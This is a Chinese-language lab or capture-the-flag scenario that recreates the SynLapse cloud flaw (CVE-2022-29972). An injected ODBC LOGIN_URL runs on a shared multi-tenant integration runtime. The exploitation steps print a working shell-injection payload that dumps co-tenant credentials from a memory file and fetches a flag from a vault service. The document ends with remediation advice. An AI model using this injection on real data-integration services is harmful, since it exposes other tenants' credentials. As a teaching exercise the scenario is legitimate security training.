# CLOUD-15 SynLapse：共享集成运行时跨租户凭据

## 场景信息

| 字段 | 值 |
|---|---|
| ID | CLOUD-15 |
| 名称 | SynLapse: Shared Integration Runtime → Co-Tenant Credentials |
| 技术/CVE | N/A (ODBC driver injection, CVE-2022-29972 lineage, case #062) |
| 难度 | L3 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10626 |
| 入口身份 | 宿主侧黑盒起点（无云凭据，需自行派生） |
| 终点 | 共享集成运行时 经 flag-vault 交付（network-source：共享运行时地址（注入的命令直达 vault）） |

## 场景概述
分析平台把管道执行放到共享的多租户集成运行时（AutoResolveIntegrationRuntime）。
捆绑的 Redshift ODBC 驱动的 SAML 插件对 LOGIN_URL 做 shell 拼接，且"运行时选择"
只发生在客户端：攻击者把 runtime 名换成共享池后，注入的命令在多租户 worker 上
以 SYSTEM 执行，内存里躺着其他租户的凭据。

## 教材锚点
- 案例：SynLapse / CVE-2022-29972（#062）
- 平面：数据面 worker → 失败边界：命名空间（共享池）
- 六镜头：SHARED（共享 IR 是爆炸半径）；MAGIC（捆绑驱动的便利即攻击面）；
  DETECTION（客户看不到 worker 内部执行）

## 前置知识
- 集成运行时 / ETL worker 模型；ODBC 连接字符串注入
- "运行时归属只由客户端声明"（服务端不校验）

## 利用步骤

1. 查看控制面文档，确认存在共享运行时 `AutoResolveIntegrationRuntime`。
2. 构造恶意连接字符串，在 `LOGIN_URL` 里放 shell 命令：先 dump 同机 co-tenant 凭据，
   再从共享运行时自己的内网地址向 flag-vault 取密文：
   `LOGIN_URL={cat /app/memory.json; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())";}`
3. 以 `runtime_name=AutoResolveIntegrationRuntime` 提交管道。
4. 共享 worker 执行注入命令，返回 co-tenant 凭据与供应商密文。

## Flag

- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
- 交付条件：只有 共享集成运行时 向 flag-vault 出示「共享运行时地址（注入的命令直达 vault）」（校验模式 `network-source`）时才交付；
  其它容器、容器环境变量、落地文件与日志里都没有明文。
- 形态：`flag{cloud-15-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
- 验收：`python3 scripts/validate-cloud-gate.py cloud-15 <flag>`（gate）+
  `python3 tests/cloud/run.py cloud-15 <flag>`（参考利用）。

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Data integration control plane, shared runtime, and ODBC |
| 侦察与前置条件 | Runtime selection and connection-string handling |
| 核心漏洞与利用 | Send an ODBC driver/LOGIN_URL injection to the shared runtime |
| 权限、横向或影响 | Co-tenant credential disclosure from shared execution |
| 验证 | Read the shared runtime result/flag |

## 修复建议
IR 节点必须专用、临时、单租户（修复后架构）；捆绑驱动的连接字符串
参数必须白名单过滤；worker 内存不得驻留跨租户凭据；管理凭据应短时效。
